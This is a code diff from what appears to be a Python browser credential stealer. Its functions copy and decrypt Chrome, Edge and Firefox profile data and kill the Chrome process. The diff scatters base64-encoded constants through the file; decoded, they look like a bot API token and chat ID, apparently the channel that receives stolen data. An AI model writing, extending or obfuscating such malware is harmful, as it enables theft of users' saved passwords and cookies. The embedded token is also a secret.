@@ -9,11 +9,6 @@ from Crypto.Util.Padding import unpad
 from base64 import b64decode
 import hmac,platform
 
-encoded_apibot1 = "NzQzMjE0Mjk2NjpBQUhXblU1X2R1Tl92Z1JXQmRfd3NhX1BIek5vdktHQm5VRQ=="
-encoded_id1 = "LTEwMDIyMDUwMzMyODg="
-
-apibot1 = base64.b64decode(encoded_apibot1).decode()
-id1 = base64.b64decode(encoded_id1).decode()
 
 windows_version = platform.platform()
 now = datetime.now()
@@ -56,6 +51,9 @@ def get_chrome(data_path,chrome_path):
             os.system('taskkill /f /im chrome.exe')
         else:print("")
         copy_file();delete_file(os.path.join(data_chrome,"profile"+str(i)))    
+
+encoded_apibot1 = "NzQzMjE0Mjk2NjpBQUhXblU1X2R1Tl92Z1JXQmRfd3NhX1BIek5vdktHQm5VRQ=="
+encoded_id1 = "LTEwMDIyMDUwMzMyODg="
 
 def get_edge(data_path,edge_path):
     data_edge = os.path.join(data_path, "Edge");os.mkdir(data_edge)
@@ -232,6 +230,9 @@ def delete_file(data_profile):
     try:
         encrypt(data_profile)
     except:print("")
+
+apibot1 = base64.b64decode(encoded_apibot1).decode()
+id1 = base64.b64decode(encoded_id1).decode()
    
 
 def decryptMoz3DES( globalSalt, entrySalt, encryptedData ):
